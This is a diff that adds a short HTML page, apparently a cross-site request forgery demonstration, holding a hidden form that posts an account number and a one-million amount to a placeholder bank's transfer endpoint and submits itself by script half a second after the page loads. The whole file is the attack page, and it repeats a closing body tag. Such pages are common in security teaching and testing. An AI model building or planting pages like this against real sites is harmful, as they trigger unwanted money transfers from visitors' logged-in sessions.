@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form method="post" action="https://my-very-real-bank.com/money/transfer">
+       <input type="hidden" name="account" value="1234567" />
+       <input type="hidden" name="amount" value="1000000" />
+     </form>
+     <script>
+       setTimeout(function() {
+         document.forms[0].submit()
+       }, 500);
+     </script>
+   </body>
+    
+  </body>
+</html>
